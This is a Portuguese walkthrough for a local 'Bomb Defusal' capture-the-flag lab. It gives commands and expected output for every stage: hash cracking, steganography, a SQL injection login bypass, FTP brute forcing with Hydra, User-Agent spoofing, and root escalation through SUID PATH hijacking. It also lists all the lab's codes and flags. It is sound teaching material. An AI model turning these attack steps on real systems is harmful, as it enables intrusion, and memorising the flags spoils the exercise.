# Walkthrough - Bomb Defusal CTF

Este walkthrough descreve o passo a passo esperado para a resolução do CTF criado pelos desenvolvedores, sendo possível a existência de outras sequências por caminhos não intencionais.

O fluxo da solução consiste em: enumeração dos serviços, início do desafio pela interface web, resolução dos oito fios, desarme da bomba, acesso SSH e escalada de privilégios.

## 1. Enumeração das Portas

Superfície de ataque: FTP, SSH e HTTP.

Espera-se identificar os serviços com este comando ou similar:

```bash
nmap -T4 localhost -A
```

O resultado será:

```text
21/tcp   open  ftp     vsftpd 3.0.2
2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
8000/tcp open  http    Apache httpd 2.4.67 ((Debian))
```

## 2. Enumeração dos Diretórios Web

Espera-se identificar os diretórios públicos com este comando ou similar:

```bash
gobuster dir -u http://localhost:8000 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-x php,html,txt,css,js
```

O resultado será:

```text
/index.php            (Status: 200)
/Content              (Status: 301) [--> http://localhost:8000/Content/]
/Assets               (Status: 301) [--> http://localhost:8000/Assets/]
```

## 3. Acesso ao `/` da Aplicação Web

O usuário deve acessar a raiz da aplicação e iniciar o desafio clicando em `Start Challenge`. Até isso acontecer, todas as páginas dos fios estarão bloqueadas.

```text
http://localhost:8000/
```

Após iniciar o desafio, o painel da bomba exibirá os oito fios. Cada fio leva para uma etapa diferente e cada código errado digitado no painel remove 60 segundos do temporizador.

## 4. Fio Vermelho - Base64 Repetido

Primeira vulnerabilidade: dado sensível protegido por Base64 aplicado 32 vezes.

Dica do hacker:

```html
<!-- Hello, secret agent... -->
<!-- I knew they’d send you—they’re so predictable 🙄... -->
<!-- Well, as you can see, I tend to go a bit overboard, but that’s what they say: "When in doubt, use a power of two." -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A string tem formato de Base64, incluindo padding com `==`, bem característico desse tipo de codificação.
- Base64 aumenta o tamanho do conteúdo. Ao ver uma string Base64 muito grande, o usuário deve considerar que ela pode ter sido codificada múltiplas vezes.
- A dica do hacker fala em uma potência de dois.
- Sendo assim, é lógico testar quantidades como `2`, `4`, `8`, `16`, `32` e `64`.
- É responsabilidade do usuário tentar essas possibilidades em ordem crescente até encontrar uma saída legível.

Solução:

Salvar o conteúdo do fio em `red_work.txt` e decodificar a string 32 vezes em Base64:

```bash
for i in $(seq 1 32); do
    base64 -d red_work.txt > red_next.txt
    mv red_next.txt red_work.txt
done
cat red_work.txt
```

Resultado esperado:

```text
AF32CD
```

O código `AF32CD` deve ser inserido no painel para cortar o fio vermelho.

## 5. Fio Laranja - Hash MD5 com Salt

Segunda vulnerabilidade: hash feito com senha fraca e com salt exposto por dica.

Dica do hacker:

```html
<!-- Hi, Secret Agent, orange is my favorite color 🤠. -->
<!-- Is orange your favorite color too??? Wow, what an explosive revelation 🤯. -->
<!-- Well, since you have good taste, here’s a great tip: things always get better with a bit of salt, especially if that salt is a “BOMB” 💥💥💥💥💥💥. -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A página exibe o hash `54d5cfb704d716a9057b549c3620f559`.
- O hash tem 32 caracteres hexadecimais, formato compatível com MD5.
- A dica do hacker informa que existe um salt e deixa claro que o salt é `BOMB`.
- O usuário não sabe inicialmente se o hash foi feito como `senha + salt` ou `salt + senha`.
- Portanto, ele deve testar as duas possibilidades.

Solução:

```bash
hashcat -m 10 -a 0 54d5cfb704d716a9057b549c3620f559:BOMB \
/usr/share/wordlists/rockyou.txt

hashcat -m 10 54d5cfb704d716a9057b549c3620f559:BOMB --show
```

Resultado esperado:

```text
C0FFEE
```

O código `C0FFEE` deve ser inserido no painel para cortar o fio laranja.

## 6. Fio Amarelo - Esteganografia em Vídeo e Áudio

Terceira vulnerabilidade: segredo escondido em arquivo de mídia fornecido.

Dica do hacker:

```html
<!-- Hi, Secret Agent 🥸. -->
<!-- I was thinking—since we have so much in common—maybe we’d get along really well as friends 🤔… -->
<!-- Well, as my newest friend, I want to share an amazing moment with you: watch one of the best free-kick takers in action ⚽. -->
<!-- Pay close attention to how this audio is simply mind-blowing 🥶💣. -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A página entrega o arquivo `Content/challenge.mkv`.
- A dica do hacker chama atenção para o áudio.
- Arquivos de vídeo podem conter trilhas de áudio, dados embutidos e outros arquivos anexados.
- A referência ao melhor cobrador de faltas leva ao nome `JUNINHO_PERNAMBUCANO`.

Solução:

Baixar o vídeo:

```bash
curl -s "http://localhost:8000/Content/challenge.mkv" -o challenge.mkv
```

Extrair o áudio:

```bash
ffmpeg -i challenge.mkv -vn -c:a pcm_s16le extracted_audio.wav
```

Extrair a senha escondida no áudio:

```bash
steghide extract -sf extracted_audio.wav -p "" -xf audio_password.txt
cat audio_password.txt
```

Resultado esperado:

```text
PASSWORD:`THE_BEST_FREE_KICK_TAKER_IS_JUNINHO_PERNAMBUCANO`
```

Procurar arquivos embutidos no vídeo:

```bash
binwalk -e challenge.mkv
find _challenge.mkv.extracted -type f -name "*.zip"
```

Resultado esperado:

```text
_challenge.mkv.extracted/13C6675.zip
```

Abrir o ZIP usando a senha recuperada no áudio:

```bash
unzip -P THE_BEST_FREE_KICK_TAKER_IS_JUNINHO_PERNAMBUCANO \
_challenge.mkv.extracted/13C6675.zip

cat yellow_code.txt
```

Resultado esperado:

```text
FE21DA
```

O código `FE21DA` deve ser inserido no painel para cortar o fio amarelo.

## 7. Fio Verde - SQL Injection com Bypass de Filtro Client-Side

Quarta vulnerabilidade: SQL Injection por concatenação direta de parâmetros no backend.

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A página apresenta um formulário de login.
- O JavaScript bloqueia caracteres e tokens comuns de SQL Injection.
- O bloqueio acontece no navegador, antes da requisição ser enviada.
- Validações feitas apenas no cliente podem ser ignoradas interceptando ou montando a requisição manualmente.
- O backend concatena os parâmetros diretamente na query SQL.

Solução:

Interceptar o POST do formulário com Burp Suite e inserir um SQLi, como admin ' OR 1=1 --.


Após a execução do bypass da login o usuário terá acesso ao código do fio:

```text
071EBD
```

O código `071EBD` deve ser inserido no painel para cortar o fio verde.

## 8. Fio Azul - Rota Oculta

Quinta vulnerabilidade: rota sensível acessível por um valor de `route` descoberto por wordlist.

Dica do hacker:

```html
<!-- Look who's still here, Secret Agent 🙄. -->
<!-- Trying to find the secret route in my perfectly designed system? How original 🥱. -->
<!-- Since you clearly have absolutely no idea where you are going, I decided to leave you some light reading material 📖. -->
<!-- I appropriately named it "good_luck_mister.txt", because you are going to need a miracle to guess the right path 🍀. -->
<!-- Go ahead, keep aggressively knocking on every single door like a brute. I just love watching you try to *fuzz* your way out of this one 🚪🥊. -->
<!-- Tick-tock, mister... tick-tock ⏱️💥. -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A página disponibiliza a wordlist `good_luck_mister.txt`.
- A dica do hacker fala em encontrar uma rota secreta.
- A dica também usa diretamente a ideia de fuzzing.
- A aplicação usa o parâmetro `route` para controlar qual página será carregada.

Solução:

Baixar a wordlist:

```bash
curl -s "http://localhost:8000/Content/goodluck.txt" -o goodluck.txt
```

Fazer fuzzing no parâmetro `route`:

```bash
ffuf -u "http://localhost:8000/index.php?route=FUZZ" \
-w goodluck.txt -mc all -fs 15
```

Resultado esperado:

```text
hermanos
```

Acessar a rota encontrada:

```text
http://localhost:8000/index.php?route=hermanos
```

Resultado esperado:

```text
A7F3C9
```

A página também mostra a pista `Junior! Create harder challenges!`, que será usada no FTP.

O código `A7F3C9` deve ser inserido no painel para cortar o fio azul.

## 9. Fio Rosa - FTP com Credencial Fraca

Sexta vulnerabilidade: senha fraca em serviço FTP.

Dica do hacker:

```html
<!-- Well, well, well, Secret Agent... still snooping around my ports? 🕵️‍♂️ -->
<!-- It seems you're trying to get some highly classified files now 📁🗄️. -->
<!-- Good luck with that! My server is locked up tight, and standard guessing won't get you anywhere near my password 🚫. -->
<!-- You are going to need a real monster to break into this one... maybe a legendary, multi-headed beast? 🐉🌊 -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A enumeração inicial mostrou FTP aberto na porta `21`.
- A dica do hacker fala em arquivos classificados.
- A dica também menciona uma criatura de várias cabeças, referência à ferramenta Hydra.
- A etapa anterior revelou o nome `Junior`, usado como candidato de usuário.

Solução:

Usar Hydra para testar a senha do usuário `Junior`:

```bash
hydra -l Junior -P /usr/share/wordlists/rockyou.txt -s 21 ftp://localhost -I -f
```

Resultado esperado:

```text
[21][ftp] host: localhost   login: Junior   password: ronaldinho
```

Entrar no FTP:

```bash
ftp localhost
```

Credenciais:

```text
Name: Junior
Password: ronaldinho
```

Baixar os arquivos:

```text
get code.txt
get secret.zip
```

Ler o arquivo `code.txt`:

```bash
cat code.txt
```

Resultado esperado:

```text
Congratulation, agent BombDefuser! Where is your reward:
DEADC0
```

O código `DEADC0` deve ser inserido no painel para cortar o fio rosa.

O arquivo `secret.zip` deve ser guardado. Ele será usado depois do desarme da bomba.

## 10. Fio Roxo - Autorização por User-Agent

Sétima vulnerabilidade: autorização baseada apenas no cabeçalho `User-Agent`.

Dica do hacker ao acessar sem o agente correto:

```html
<!-- ACCESS DENIED. 🚨❌ -->
<!-- Ouch... that's got to hurt your ego, Secret Agent 🤫. -->
<!-- Did you really think my server would just let *anyone* in? You're wearing the wrong outfit. -->
<!-- This door is strictly reserved for a very exclusive "agent", and right now, your request is looking completely generic 🥱. -->
```

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- Sem o cabeçalho correto, o acesso é negado.
- A dica fala em vestir a roupa errada e em um `agent` exclusivo.
- O FTP revelou o texto `agent BombDefuser`.
- Logo, `BombDefuser` deve ser usado como valor do cabeçalho `User-Agent`.

Solução:

Interceptar a requisição com Burp Suite e alterar o `User-Agent` para `BombDefuser`.

A página irá exibir o código do fio:

```text
4C9E2B
```

O código `4C9E2B` deve ser inserido no painel para cortar o fio roxo.

## 11. Fio Ciano - Esteganografia em PNG

Oitava vulnerabilidade: segredo escondido nos bits menos significativos de uma imagem pública.

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A página exibe apenas uma imagem: `Content/trophy.png`.
- Não existe formulário, texto codificado ou lógica web aparente.
- Em desafios de CTF, imagens sem interação costumam indicar análise de metadados ou esteganografia.
- A técnica LSB é uma tentativa natural para arquivos PNG.

Solução:

Analisar a imagem com o programa `zsteg`:

```bash
zsteg trophy.png
```

Informação relevante esperada:

```text
b1,rgb,lsb,xy       .. text: "flag{5AFECA}"
```

O código `5AFECA` deve ser inserido no painel para cortar o fio ciano.

## 12. Desarme da Bomba

Depois de recuperar os oito códigos, o usuário deve voltar ao painel principal e inserir cada código no teclado hexadecimal. A ordem não importa e isso pode ser feito em qualquer momento do CTF.

Resumo dos códigos:

| Fio | Código |
| --- | --- |
| Vermelho | `AF32CD` |
| Laranja | `C0FFEE` |
| Amarelo | `FE21DA` |
| Verde | `071EBD` |
| Azul | `A7F3C9` |
| Rosa | `DEADC0` |
| Roxo | `4C9E2B` |
| Ciano | `5AFECA` |

Resultado esperado:

```text
Todos os fios cortados.
Bomba desarmada.
```

Após o desarme, o display alterna entre `SAFE` e o código final:

```text
D3F347
```

Esse código é a senha do `secret.zip` baixado no FTP.

## 13. Acesso SSH

Nona vulnerabilidade: chave privada exposta dentro do ZIP obtido na cadeia do desafio.

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- O FTP forneceu o arquivo `secret.zip`.
- A senho do ZIP ainda não tinha sido fornecida.
- Após desarmar a bomba, o painel exibe `D3F347` que pelo formato do CTF indica um dado importante.
- Essa senha abre o ZIP e revela uma chave privada SSH.
- A enumeração inicial mostrou SSH aberto na porta `2222`.

Solução:

Abrir o ZIP:

```bash
unzip -P D3F347 secret.zip
```

Arquivos esperados:

```text
id_rsa
truth.txt
```

Ler a mensagem:

```bash
cat truth.txt
```

A mensagem aponta para `/root/secret`, indicando que ainda existe uma etapa privilegiada.

Acessar o SSH como `junior`:

```bash
chmod 600 id_rsa
ssh -i id_rsa junior@localhost -p 2222
```

Confirmar o acesso:

```bash
cat /home/junior/user.txt
```

Resultado esperado:

```text
CTF{b0mb_h4s_b33n_pl4n73d}
```

## 14. Escalada de Privilégios - SUID e PATH Hijacking

Decima vulnerabilidade: binário SUID executando comando externo sem caminho absoluto.

O usuário deve chegar a essa conclusão devido aos seguintes indicativos:

- A mensagem do `truth.txt` aponta para `/root/secret`.
- O usuário `junior` não tem permissão direta para acessar `/root`.
- A enumeração de binários SUID revela `/usr/local/bin/detonate`.
- O código-fonte mostra `system("rm -rf /root/secret");`.
- Como `rm` não usa caminho absoluto, o binário depende do `PATH` do usuário.

Solução:

Enumerar binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Binário relevante:

```text
/usr/local/bin/detonate
```

Analisar o binário e o código-fonte:

```bash
ls -l /usr/local/bin/detonate
cat /var/www/app/Jobs/detonate.c
```

Trecho vulnerável:

```c
system("rm -rf /root/secret");
```

Criar um `rm` falso antes do `rm` real no `PATH`:

```bash
mkdir -p /tmp/hijack

cat > /tmp/hijack/rm <<'EOF'
#!/bin/sh
id > /tmp/path_hijack_proof.txt
cat /root/flag.txt > /tmp/root_flag.txt
chmod 644 /tmp/root_flag.txt
exit 0
EOF

chmod +x /tmp/hijack/rm
```

Executar o binário SUID com o `PATH` controlado:

```bash
PATH=/tmp/hijack:$PATH /usr/local/bin/detonate
```

Confirmar a execução como root:

```bash
cat /tmp/path_hijack_proof.txt
cat /tmp/root_flag.txt
```

Resultado esperado:

```text
uid=0(root) gid=0(root) groups=0(root),33(www-data),1000(junior)
CTF{b0mb_h4s_b33n_d3fus3d}
```

## Resumo das Falhas e Vulnerabilidades

| Etapa | Classificação | Quebra esperada |
| --- | --- | --- |
| Fio vermelho | Falha criptográfica | Base64 repetido 32 vezes |
| Fio laranja | Falha criptográfica | MD5 com salt testando `senha + salt` e `salt + senha` |
| Fio amarelo | Falha de exposição | Esteganografia em áudio e ZIP embutido no vídeo |
| Fio verde | Vulnerabilidade | SQL Injection no backend |
| Fio azul | Falha de controle de acesso | Rota oculta descoberta por fuzzing |
| Fio rosa | Vulnerabilidade | Credencial fraca no FTP |
| Fio roxo | Vulnerabilidade | Autorização por `User-Agent` |
| Fio ciano | Falha de exposição | Segredo em LSB de PNG |
| SSH | Falha de exposição | Chave privada dentro do ZIP pós-desarme |
| Escalada | Vulnerabilidade local | SUID com PATH hijacking |
